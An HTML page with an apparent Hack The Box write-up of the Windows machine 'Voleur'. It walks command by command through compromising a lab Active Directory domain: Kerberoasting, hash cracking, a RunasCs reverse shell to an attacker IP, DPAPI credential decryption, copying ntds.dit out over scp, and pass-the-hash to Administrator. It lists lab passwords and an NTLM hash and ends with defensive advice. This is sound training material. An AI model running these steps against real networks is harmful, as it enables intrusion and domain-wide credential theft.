<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voleur Writeup | PLSCARRYME - HTB Writeups</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #e0e0e0;
            line-height: 1.8;
            min-height: 100vh;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* Header */
        header {
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            border-bottom: 2px solid #9fef00;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 0;
        }

        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #9fef00;
            text-decoration: none;
        }

        .back-link {
            color: #9fef00;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            transition: opacity 0.3s ease;
        }

        .back-link:hover {
            opacity: 0.8;
        }

        /* Writeup Header */
        .writeup-header {
            text-align: center;
            padding: 3rem 0;
            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
            margin-bottom: 3rem;
        }

        .writeup-title {
            font-size: 3rem;
            color: #9fef00;
            margin-bottom: 1rem;
            text-shadow: 0 0 20px rgba(159, 239, 0, 0.3);
        }

        .writeup-meta {
            display: flex;
            justify-content: center;
            gap: 2rem;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
        }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            opacity: 0.8;
        }

        .difficulty {
            padding: 0.5rem 1rem;
            border-radius: 25px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9rem;
        }

        .difficulty.easy { background: #28a745; }
        .difficulty.medium { background: #ffc107; color: #000; }
        .difficulty.hard { background: #dc3545; }

        .writeup-tags {
            display: flex;
            justify-content: center;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .tag {
            background: rgba(159, 239, 0, 0.2);
            color: #9fef00;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.8rem;
        }

        /* Content */
        .writeup-content {
            padding-bottom: 3rem;
        }

        .writeup-content h1,
        .writeup-content h2,
        .writeup-content h3 {
            color: #9fef00;
            margin: 2rem 0 1rem 0;
            border-left: 4px solid #9fef00;
            padding-left: 1rem;
        }

        .writeup-content h1 { font-size: 2rem; }
        .writeup-content h2 { font-size: 1.5rem; }
        .writeup-content h3 { font-size: 1.2rem; }

        .writeup-content p {
            margin-bottom: 1.5rem;
            text-align: justify;
        }

        .writeup-content ul,
        .writeup-content ol {
            margin: 1rem 0 1.5rem 2rem;
        }

        .writeup-content li {
            margin-bottom: 0.5rem;
        }

        /* Code blocks */
        .writeup-content pre {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(159, 239, 0, 0.3);
            border-radius: 8px;
            padding: 1.5rem;
            overflow-x: auto;
            margin: 1.5rem 0;
            position: relative;
        }

        .writeup-content code {
            color: #9fef00;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }

        .writeup-content p code {
            background: rgba(159, 239, 0, 0.2);
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-size: 0.85rem;
        }

        /* Images */
        .writeup-content img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 2rem 0;
            border: 1px solid rgba(159, 239, 0, 0.3);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        }

        /* Blockquotes */
        .writeup-content blockquote {
            border-left: 4px solid #9fef00;
            background: rgba(159, 239, 0, 0.1);
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
            font-style: italic;
        }

        /* Navigation buttons */
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin: 3rem 0;
            gap: 1rem;
        }

        .nav-button {
            background: linear-gradient(45deg, #9fef00, #7bc800);
            color: #000;
            padding: 1rem 2rem;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            text-decoration: none;
            transition: transform 0.2s ease;
            flex: 1;
            text-align: center;
            max-width: 200px;
        }

        .nav-button:hover {
            transform: translateY(-2px);
        }

        .nav-button.disabled {
            background: rgba(255, 255, 255, 0.1);
            color: #666;
            cursor: not-allowed;
        }

        /* Progress bar */
        .reading-progress {
            position: fixed;
            top: 0;
            left: 0;
            width: 0%;
            height: 3px;
            background: linear-gradient(to right, #9fef00, #7bc800);
            z-index: 1000;
            transition: width 0.1s ease;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .writeup-title {
                font-size: 2rem;
            }

            .writeup-meta {
                flex-direction: column;
                gap: 1rem;
            }

            .writeup-content pre {
                padding: 1rem;
                font-size: 0.8rem;
            }

            .nav-buttons {
                flex-direction: column;
            }

            .nav-button {
                max-width: none;
            }
        }

        /* Highlight boxes */
        .info-box {
            background: rgba(0, 123, 255, 0.1);
            border-left: 4px solid #007bff;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
        }

        .warning-box {
            background: rgba(255, 193, 7, 0.1);
            border-left: 4px solid #ffc107;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
        }

        .success-box {
            background: rgba(40, 167, 69, 0.1);
            border-left: 4px solid #28a745;
            padding: 1rem 1.5rem;
            margin: 1.5rem 0;
            border-radius: 0 8px 8px 0;
        }

        .step-section {
            margin: 3rem 0;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 12px;
            border: 1px solid rgba(159, 239, 0, 0.1);
        }

        /* Toggle sections */
        details {
            margin: 2rem 0;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 12px;
            border: 1px solid rgba(159, 239, 0, 0.1);
        }

        summary {
            font-weight: 600;
            font-size: 1.5em;
            line-height: 1.3;
            margin: 0;
            padding: 1.5rem;
            cursor: pointer;
            color: #9fef00;
            border-radius: 12px;
            transition: background 0.3s ease;
        }

        summary:hover {
            background: rgba(159, 239, 0, 0.05);
        }

        details[open] summary {
            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
            border-radius: 12px 12px 0 0;
        }

        .indented {
            padding: 1.5rem;
        }

        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 2rem 0;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 8px;
            overflow: hidden;
        }

        th, td {
            padding: 1rem;
            text-align: left;
            border-bottom: 1px solid rgba(159, 239, 0, 0.2);
        }

        th {
            background: rgba(159, 239, 0, 0.1);
            color: #9fef00;
            font-weight: bold;
        }

        tr:hover {
            background: rgba(159, 239, 0, 0.05);
        }
    </style>
</head>
<body>
    <div class="reading-progress" id="reading-progress"></div>
    
    <header>
        <nav class="container">
            <a href="../index.html" class="logo"><i class="fas fa-terminal"></i> PLSCARRYME</a>
            <a href="../index.html" class="back-link">
                <i class="fas fa-arrow-left"></i>
                Back to Home
            </a>
        </nav>
    </header>

    <main class="container">
        <section class="writeup-header">
            <h1 class="writeup-title">🔒 Voleur</h1>
            
            <div class="writeup-meta">
                <div class="meta-item">
                    <i class="fas fa-calendar"></i>
                    <span>July 9, 2025</span>
                </div>
                <div class="meta-item">
                    <i class="fas fa-desktop"></i>
                    <span>Windows</span>
                </div>
                <div class="meta-item">
                    <i class="fas fa-clock"></i>
                    <span>8 hours</span>
                </div>
                <div class="meta-item">
                    <span class="difficulty medium">Medium</span>
                </div>
            </div>

            <div class="writeup-tags">
                <span class="tag">Active Directory</span>
                <span class="tag">Kerberos</span>
                <span class="tag">LDAP</span>
                <span class="tag">SMB</span>
                <span class="tag">DPAPI</span>
                <span class="tag">Kerberoasting</span>
                <span class="tag">WSL</span>
                <span class="tag">NTDS</span>
            </div>
        </section>

        <section class="writeup-content">
            <details open>
                <summary>Enumeration</summary>
                <div class="indented">
                    <h3>🔍 1. Initial Enumeration – Nmap</h3>
                    <p>I started with a comprehensive port scan to identify running services:</p>
                    
                    <pre><code class="language-bash">nmap -p- --min-rate 10000 -vv 10.10.11.76</code></pre>

                    <table>
                        <thead>
                            <tr>
                                <th>Port</th>
                                <th>Service Name</th>
                                <th>Description</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><strong>53</strong></td>
                                <td><code>domain</code> (DNS)</td>
                                <td>Domain Name System – used for name resolution.</td>
                            </tr>
                            <tr>
                                <td><strong>88</strong></td>
                                <td><code>kerberos-sec</code></td>
                                <td>Kerberos authentication – core to AD logins.</td>
                            </tr>
                            <tr>
                                <td><strong>389</strong></td>
                                <td><code>ldap</code></td>
                                <td>LDAP – used for querying Active Directory.</td>
                            </tr>
                            <tr>
                                <td><strong>445</strong></td>
                                <td><code>microsoft-ds</code></td>
                                <td>SMB – file sharing, remote admin, AD communication.</td>
                            </tr>
                            <tr>
                                <td><strong>5985</strong></td>
                                <td><code>wsman</code></td>
                                <td>WinRM – remote Windows management (over HTTP).</td>
                            </tr>
                            <tr>
                                <td><strong>2222</strong></td>
                                <td>SSH (Custom)</td>
                                <td>Custom SSH service, likely WSL.</td>
                            </tr>
                        </tbody>
                    </table>

                    <p>The scan revealed a Windows Active Directory environment with domain <code>VOLEUR.HTB</code>.</p>

                    <hr>

                    <h3>🔐 2. SMB Authentication Testing</h3>
                    <p>Initial enumeration using the provided credentials <code>ryan.naylor:HollowOct31Nyt</code>:</p>

                    <img src="image.png" alt="Initial SMB access attempt showing access denied">

                    <p>Standard SMB access was denied, indicating additional authentication mechanisms required.</p>

                    <hr>

                    <h3>⏰ 3. Time Synchronization</h3>
                    <pre><code class="language-bash">sudo ntpdate voleur.htb</code></pre>

                    <img src="image%201.png" alt="Time synchronization with domain controller">

                    <div class="warning-box">
                        <strong>Critical:</strong> Time synchronization is essential for Kerberos authentication. A time skew of more than 5 minutes will cause authentication failures.
                    </div>

                    <hr>

                    <h3>🎫 4. LDAP with Kerberos Authentication</h3>
                    <p>Standard NTLM authentication failed with <code>STATUS_NOT_SUPPORTED</code>, but Kerberos worked:</p>

                    <pre><code class="language-bash">nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k</code></pre>

                    <img src="image%203.png" alt="Successful Kerberos authentication">

                    <hr>

                    <h3>👥 5. Domain User Enumeration</h3>
                    <pre><code class="language-bash">nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users</code></pre>

                    <img src="image%205.png" alt="Domain user enumeration results">

                    <hr>

                    <h3>📁 6. SMB Share Enumeration via Kerberos</h3>
                    <img src="image%206.png" alt="SMB share enumeration">

                    <p>Using Kerberos authentication, I accessed SMB shares:</p>
                    <pre><code class="language-bash">smbclient.py -k dc.voleur.htb</code></pre>

                    <p>Available shares:</p>
                    <ul>
                        <li>✅ <strong>IT</strong> – Accessible with <code>First-Line Support/</code> subfolder</li>
                        <li>✅ <strong>SYSVOL/NETLOGON</strong> – Standard AD shares</li>
                        <li>❌ <strong>HR/Finance</strong> – Access denied</li>
                    </ul>

                    <hr>

                    <h3>📄 7. Excel File Discovery</h3>
                    <p>Found <code>Access_Review.xlsx</code> in the IT First-Line Support directory:</p>

                    <img src="image%207.png" alt="Excel file discovery">
                    <img src="image%208.png" alt="Password protected Excel file">
                </div>
            </details>

            <details open>
                <summary>Credential Discovery</summary>
                <div class="indented">
                    <h3>🔓 8. Excel Password Cracking</h3>
                    <img src="image%209.png" alt="Office2john hash extraction">

                    <p>Extracted and cracked the Excel password:</p>
                    <pre><code class="language-bash">office2john Access_Review.xlsx > hash.txt
john hash.txt --show</code></pre>

                    <div class="success-box">
                        <strong>Password recovered:</strong> football1
                    </div>

                    <img src="image%2010.png" alt="Successful password crack">

                    <hr>

                    <h3>📊 9. Excel Analysis - Critical Findings</h3>
                    <table>
                        <thead>
                            <tr>
                                <th>Account</th>
                                <th>Purpose</th>
                                <th>Password</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><code>svc_ldap</code></td>
                                <td>LDAP Services</td>
                                <td><code>M1XyC9pW7qT5Vn</code></td>
                            </tr>
                            <tr>
                                <td><code>svc_iis</code></td>
                                <td>IIS Administration</td>
                                <td><code>N5pXyW1VqM7CZ8</code></td>
                            </tr>
                        </tbody>
                    </table>

                    <p>Additional findings:</p>
                    <ul>
                        <li><strong>Ryan Naylor:</strong> Kerberos Pre-Auth disabled (AS-REP Roasting target)</li>
                        <li><strong>Deleted Account:</strong> tess.maffe with password <code>NightT1meP1dg3on14</code></li>
                    </ul>

                    <hr>

                    <h3>🧠 10. BloodHound Analysis</h3>
                    <pre><code class="language-bash">bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -c All -ns 10.10.11.76 -k --zip</code></pre>

                    <img src="image%2011.png" alt="BloodHound data collection">

                    <p>Key attack paths identified:</p>
                    <ul>
                        <li><code>SVC_LDAP</code> has <strong>WriteSPN</strong> on <code>SVC_WINRM</code> → Kerberoasting opportunity</li>
                        <li><code>SVC_LDAP</code> in <strong>RESTORE_USERS</strong> → Can restore deleted AD objects</li>
                        <li>Multiple GenericWrite permissions for privilege escalation</li>
                    </ul>
                </div>
            </details>

            <details open>
                <summary>User Access</summary>
                <div class="indented">
                    <img src="image%2012.png" alt="Service account access overview">

                    <h3>🔑 11. Service Account Authentication</h3>
                    <pre><code class="language-bash">impacket-getTGT voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.10.11.76
export KRB5CCNAME=svc_ldap.ccache</code></pre>

                    <hr>

                    <h3>⚔️ 12. Kerberoasting Attack</h3>
                    <pre><code class="language-bash">python3 targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb</code></pre>

                    <p>Successfully retrieved hashes for:</p>
                    <ul>
                        <li><code>lacey.miller</code></li>
                        <li><code>svc_winrm</code></li>
                    </ul>

                    <img src="image%2013.png" alt="Kerberoast hash extraction">

                    <hr>

                    <h3>🔓 13. Hash Cracking</h3>
                    <pre><code class="language-bash">hashcat -a 0 voleurhash.txt /usr/share/wordlists/rockyou.txt</code></pre>

                    <img src="image%2014.png" alt="Successful hash cracking">

                    <div class="success-box">
                        <strong>Cracked:</strong> svc_winrm:AFireInsidedeOzarctica980219afi
                    </div>

                    <hr>

                    <h3>⚙️ 14. Kerberos Configuration</h3>
                    <pre><code class="language-bash">sudo tee /etc/krb5.conf >/dev/null <<'EOF'
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_kdc = false

[realms]
  VOLEUR.HTB = {
    kdc = dc.voleur.htb
    admin_server = dc.voleur.htb
  }

[domain_realm]
  .voleur.htb = VOLEUR.HTB
  voleur.htb  = VOLEUR.HTB
EOF</code></pre>

                    <hr>

                    <h3>🌐 15. WinRM Shell Access</h3>
                    <pre><code class="language-bash">impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi' -dc-ip 10.10.11.76
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb</code></pre>

                    <img src="image%2015.png" alt="Fresh TGT generation">
                    <img src="image%2016.png" alt="WinRM shell access">
                    <img src="sec.png" alt="IT directory structure showing support tiers">

                    <div class="success-box">
                        <strong>User access achieved:</strong> Shell as svc_winrm on domain controller
                    </div>
                </div>
            </details>

            <details open>
                <summary>Privilege Escalation</summary>
                <div class="indented">
                    <h3>🔄 16. Lateral Movement to svc_ldap</h3>
                    <p>Used RunasCs to pivot to svc_ldap (member of RESTORE_USERS):</p>

                    <img src="image%2017.png" alt="RunasCs lateral movement">

                    <pre><code class="language-powershell">.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.16.28:3000</code></pre>

                    <img src="image%2018.png" alt="Successful pivot">
                    <img src="image%2019.png" alt="svc_ldap shell confirmation">

                    <hr>

                    <h3>🗑️ 17. Deleted Object Recovery</h3>
                    <pre><code class="language-powershell">Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects</code></pre>

                    <img src="image%2020.png" alt="Deleted user discovery">
                    <img src="image%2021.png" alt="Todd Wolfe deleted account">

                    <p>Found deleted user: <strong>Todd Wolfe</strong></p>

                    <pre><code class="language-powershell">Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject</code></pre>

                    <hr>

                    <h3>🎫 18. Todd Wolfe Access</h3>
                    <pre><code class="language-bash">impacket-getTGT VOLEUR.HTB/todd.wolfe:'NightT1meP1dg3on14' -dc-ip 10.10.11.76
export KRB5CCNAME=todd.wolfe.ccache</code></pre>

                    <img src="image%2022.png" alt="Todd Wolfe TGT generation">

                    <hr>

                    <h3>🔐 19. DPAPI Credential Extraction</h3>
                    <p>Discovered DPAPI files in Todd's archived profile:</p>

                    <p>Downloaded credential files:</p>
                    <ul>
                        <li>Master Key: <code>08949382-134f-4c63-b93c-ce52efc0aa88</code></li>
                        <li>Credential Blob: <code>772275FAD58525253490A9B0039791D3</code></li>
                    </ul>

                    <p>Decrypted master key:</p>
                    <pre><code class="language-bash">impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14</code></pre>

                    <p>Extracted stored credential:</p>
                    <pre><code class="language-bash">impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key [decrypted_key]</code></pre>

                    <div class="success-box">
                        <strong>DPAPI Recovery:</strong> jeremy.combs:qT3V9pLXyN7W4m
                    </div>

                    <hr>

                    <h3>🐧 20. WSL Access Discovery</h3>
                    <p>Jeremy's Third-Line Support directory contained:</p>
                    <ul>
                        <li><code>id_rsa</code> - SSH private key</li>
                        <li><code>Note.txt.txt</code> - WSL configuration note</li>
                    </ul>

                    <pre><code class="language-bash">ssh -i id_rsa svc_backup@voleur.htb -p 2222</code></pre>

                    <img src="image%2023.png" alt="WSL file system access">

                    <hr>

                    <h3>💎 21. NTDS Database Exfiltration</h3>
                    <p>Located Active Directory backups in WSL:</p>
                    <ul>
                        <li><code>/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit</code></li>
                        <li><code>/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM</code></li>
                    </ul>

                    <pre><code class="language-bash">scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .</code></pre>

                    <hr>

                    <h3>👑 22. Domain Takeover</h3>
                    <pre><code class="language-bash">secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL</code></pre>

                    <img src="image%2024.png" alt="Domain hash extraction">

                    <p>Extracted Administrator hash:</p>
                    <pre><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::</code></pre>

                    <p>Final access with extracted hash:</p>
                    <pre><code class="language-bash">impacket-getTGT voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.10.11.76
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc.voleur.htb -u Administrator -r voleur.htb</code></pre>

                    <img src="image%2025.png" alt="Administrator shell access">

                    <div class="success-box">
                        <strong>Domain Takeover Complete!</strong> Administrator access achieved on VOLEUR.HTB
                    </div>
                </div>
            </details>

            <!-- Summary Section -->
            <div class="step-section">
                <h2>Attack Chain Summary</h2>
                <p>This writeup demonstrated a complex Active Directory attack involving multiple privilege escalation vectors:</p>

                <pre><code class="language-text">ryan.naylor (Initial Creds)
    → Kerberos Authentication
    → Excel File Discovery 
    → Service Account Creds (svc_ldap)
    → Kerberoasting Attack
    → svc_winrm Compromise
    → Lateral Movement to svc_ldap
    → Deleted Object Recovery (todd.wolfe)
    → DPAPI Credential Extraction
    → jeremy.combs Compromise
    → WSL SSH Access
    → NTDS Database Exfiltration
    → Administrator Hash
    → Domain Admin Access</code></pre>

                <h3>Key Techniques Demonstrated</h3>
                <ul>
                    <li><strong>Kerberos Authentication:</strong> Bypassing NTLM restrictions using Kerberos tickets</li>
                    <li><strong>Office Document Analysis:</strong> Extracting credentials from password-protected Excel files</li>
                    <li><strong>Kerberoasting:</strong> Extracting and cracking service account passwords</li>
                    <li><strong>Active Directory Restoration:</strong> Recovering deleted user accounts for privilege escalation</li>
                    <li><strong>DPAPI Exploitation:</strong> Decrypting Windows stored credentials from archived profiles</li>
                    <li><strong>WSL Abuse:</strong> Leveraging Windows Subsystem for Linux for backup file access</li>
                    <li><strong>NTDS Database Extraction:</strong> Complete domain takeover through database analysis</li>
                </ul>

                <h3>Tools Used</h3>
                <ul>
                    <li><strong>Nmap:</strong> Network reconnaissance and service enumeration</li>
                    <li><strong>NetExec (nxc):</strong> Active Directory enumeration and authentication testing</li>
                    <li><strong>BloodHound:</strong> Active Directory relationship analysis and attack path discovery</li>
                    <li><strong>office2john + John:</strong> Office document password cracking</li>
                    <li><strong>targetedKerberoast.py:</strong> Selective Kerberoasting attacks</li>
                    <li><strong>hashcat:</strong> Hash cracking for service account passwords</li>
                    <li><strong>impacket suite:</strong> Kerberos ticket management and DPAPI decryption</li>
                    <li><strong>RunasCs:</strong> Privilege escalation and lateral movement</li>
                    <li><strong>secretsdump.py:</strong> NTDS database analysis and hash extraction</li>
                    <li><strong>Evil-WinRM:</strong> Remote PowerShell access</li>
                </ul>

                <h3>Critical Vulnerabilities Exploited</h3>
                <ul>
                    <li><strong>Weak Password Protection:</strong> Easily crackable Excel file password</li>
                    <li><strong>Credential Exposure:</strong> Service account passwords stored in documentation</li>
                    <li><strong>Excessive Privileges:</strong> Service accounts with dangerous Active Directory permissions</li>
                    <li><strong>Improper Backup Security:</strong> Critical AD databases accessible through WSL</li>
                    <li><strong>DPAPI Weaknesses:</strong> Archived user profiles containing decryptable credentials</li>
                    <li><strong>Deleted Object Retention:</strong> Sensitive accounts recoverable from AD recycle bin</li>
                </ul>

                <div class="warning-box">
                    <strong>Defensive Recommendations:</strong>
                    <ul>
                        <li>Implement proper backup security and access controls</li>
                        <li>Regular audit of service account privileges and permissions</li>
                        <li>Monitor for unusual Active Directory modifications and restorations</li>
                        <li>Secure credential storage practices and avoid documentation exposure</li>
                        <li>Implement proper DPAPI key management and user profile cleanup</li>
                        <li>Enable Advanced Threat Protection for Kerberoasting detection</li>
                    </ul>
                </div>
            </div>
        </section>

        <div class="nav-buttons">
            <a href="../index.html" class="nav-button">
                <i class="fas fa-home"></i> Back to Home
            </a>
            <a href="../previous/previous-writeup.html" class="nav-button">
                Next Writeup <i class="fas fa-arrow-right"></i>
            </a>
        </div>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    
    <script>
        // Reading progress bar
        function updateReadingProgress() {
            const article = document.querySelector('.writeup-content');
            const progressBar = document.getElementById('reading-progress');
            
            const articleTop = article.offsetTop;
            const articleHeight = article.offsetHeight;
            const windowHeight = window.innerHeight;
            const scrollTop = window.pageYOffset;
            
            const progress = (scrollTop - articleTop + windowHeight/2) / articleHeight;
            const progressPercentage = Math.max(0, Math.min(100, progress * 100));
            
            progressBar.style.width = progressPercentage + '%';
        }

        // Smooth scrolling for TOC links
        document.querySelectorAll('.toc a').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Initialize
        window.addEventListener('scroll', updateReadingProgress);
        window.addEventListener('load', updateReadingProgress);
    </script>
</body>
</html>